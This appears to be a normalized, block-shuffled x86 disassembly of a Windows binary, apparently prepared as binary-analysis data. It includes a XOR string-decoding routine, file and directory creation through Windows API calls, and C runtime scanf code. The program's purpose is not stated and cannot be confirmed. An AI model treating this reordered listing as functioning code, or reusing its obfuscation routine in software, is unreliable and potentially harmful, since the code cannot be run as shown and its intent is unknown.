sub_408bc0
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_40eab5
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop edi
retn
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_4138f0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_408c39
push 0x8
push r--data
call sub_413ff0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_414035
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_403728
mov [ ebp - 0x4 ] 0xfffffffe
sub_408c90
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_408cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_41620b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x448
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor esi esi
cmp eax 0x5
ja r-xdata
or esi 0xffffffff
jmp [ eax * 4 + jump_table_408e88 ]
mov eax [ ebx + 0x4 ]
mov esi [ ebx + 0x10 ]
lea ecx [ ebp - 0x448 ]
call sub_401cf0
lea edx [ ebp - 0x1c ]
mov eax 0x1b
mov [ ebp - 0x4 ] 0x0
call sub_40c700
mov eax [ esi + 0x8 ]
mov [ ebp - 0x44c ] eax
lea ecx [ ebp - 0x454 ]
lea eax [ esi + 0x4 ]
push ecx
lea edi [ ebp - 0x448 ]
mov [ ebp - 0x450 ] eax
call sub_40cd00
mov edx [ ebp - 0x44c ]
cmp [ eax ] edx
je r-xdata
mov eax [ ebx + 0x14 ]
push eax
call sub_40f0e0
add esp 0x4
mov esi eax
neg esi
sbb esi esi
inc esi
jmp r-xdata
cmp [ ebx + 0x24 ] esi
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebx + 0x4 ]
push 0x104
lea edx [ ebp - 0x224 ]
push edx
push 0xffffffff
push eax
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
lea ecx [ ebp - 0x224 ]
push 0x5c
push ecx
call sub_40ca25
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x450 ]
mov edx edi
call sub_40cf30
mov esi [ eax ]
mov edi [ eax + 0x4 ]
push esi
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea eax [ ebp - 0x224 ]
push eax
push ecx
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x42c ]
push eax
push 0x104
add eax 0x2
push eax
lea edx [ ebp - 0x224 ]
push 0x104
push edx
call sub_4010d1
add esp 0x10
push edi
push esi
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x42c ]
push ecx
jmp r-xdata
push 0x0
push esi
call [ CreateDirectoryW@IAT ]
mov edx [ ebp - 0x448 ]
push edx
call sub_408b16
add esp 0x4
jmp r-xdata
call [ wsprintfW@IAT ]
add esp 0x10
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x42c ]
push ecx
call [ CreateFileW@IAT ]
cmp [ ebp - 0x434 ] 0x10
mov esi eax
jb r-xdata
sub_408ea0
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_401400
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_407759
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_402116
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_413163
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_41422c
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_408a33
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_40a628
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_413163
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_408a33
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_40ab76
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_408a33
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_404ad7
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_41422c
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_40f84f
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_408a33
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_405719
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_405719
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_408a33
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_4141f6
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_404ad7
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_4141f6
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_404ad7
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_413e10
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_408a33
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_408a33
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_408a33
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_4156b0
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_404ad7
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_40f84f
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_40a628
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_408a33
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_404477
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_408a33
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_404ad7
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_414216
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_41419f
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
